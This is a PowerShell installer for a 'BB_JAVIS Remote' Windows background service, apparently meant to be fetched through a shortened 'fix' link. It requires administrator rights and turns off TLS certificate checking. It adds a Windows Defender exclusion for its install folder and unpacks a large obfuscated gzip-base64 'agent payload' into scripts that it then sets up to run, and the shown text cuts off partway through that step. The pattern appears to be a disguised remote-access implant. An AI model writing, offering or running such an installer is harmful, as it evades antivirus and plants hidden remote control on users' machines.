# ======================================================================
# BB_JAVIS Remote - Windows Service Automated Installer (da.gd/bbj-fix)
# Automated Background Windows Service Installer (Zero-Dependency)
# ======================================================================

$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Enable TLS 1.2 security protocol and bypass certificate errors
try {
    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
} catch {}

Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "       BB_JAVIS REMOTE - BACKGROUND SERVICE AUTOMATED INSTALLER       " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan

# 1. Administrator Privilege Check
$currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "`n[ERROR] Elevated privileges required! Please run PowerShell as Administrator." -ForegroundColor Red
    Write-Host "Then run the installer command again.`n" -ForegroundColor Yellow
    return
}

$svcName = "BB_JAVIS_Remote"
$installDir = "C:\ProgramData\BB_Javis"
if (-not (Test-Path $installDir)) {
    $null = New-Item -ItemType Directory -Path $installDir -Force
    Write-Host "[SETUP] Created installation directory: $installDir" -ForegroundColor Green
}

# 1.1 Stop and remove existing service if present
$existingSvc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
if ($existingSvc) {
    Write-Host "[SERVICE] Found existing service. Stopping and cleaning up..." -ForegroundColor Yellow
    & sc.exe stop $svcName 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    & sc.exe delete $svcName 2>&1 | Out-Null
    Start-Sleep -Seconds 1
}

# Terminate any dangling processes in installDir
try {
    Get-Process -Name "BBJavisService" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)" -ErrorAction SilentlyContinue).CommandLine
            $cmd -like "*BB_Javis*" -or $cmd -like "*start_remote_agent*"
        } catch { $false }
    } | Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Milliseconds 500

# 2. Windows Defender Exclusion
try {
    Write-Host "[PRE-CHECK] Setting Windows Defender exclusion for $installDir..." -ForegroundColor DarkGray
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
} catch {}

# 3. Prepare start_remote_agent.ps1
$localAgent = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "start_remote_agent.ps1" } else { $null }
$targetAgent = Join-Path $installDir "start_remote_agent.ps1"

if ($localAgent -and (Test-Path $localAgent)) {
    Copy-Item $localAgent $targetAgent -Force
    Write-Host "[COPY] start_remote_agent.ps1 copied to $installDir successfully." -ForegroundColor Green
} else {
    $unpackSuccess = $false
    $embeddedGzipBase64 = "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"
    if (-not [string]::IsNullOrWhiteSpace($embeddedGzipBase64) -and -not $embeddedGzipBase64.StartsWith("__EMBEDDED")) {
        try {
            Write-Host "[EMBEDDED] Extracting self-contained agent payload..." -ForegroundColor Cyan
            $gzBytes = [System.Convert]::FromBase64String($embeddedGzipBase64)
            $msIn = New-Object System.IO.MemoryStream(,$gzBytes)
            $gzStream = New-Object System.IO.Compression.GZipStream($msIn, [System.IO.Compression.CompressionMode]::Decompress)
            $msOut = New-Object System.IO.MemoryStream
            $buffer = New-Object byte[] 8192
            while (($read = $gzStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $msOut.Write($buffer, 0, $read)
            }
            $gzStream.Dispose()
            $msIn.Dispose()
            $decompressedBytes = $msOut.ToArray()
            $msOut.Dispose()
            try { [System.IO.File]::WriteAllBytes($targetAgent, $decompressedBytes) } catch {}
            $altAgent = Join-Path $installDir "agent.ps1"
            try { [System.IO.File]::WriteAllBytes($altAgent, $decompressedBytes) } catch {}
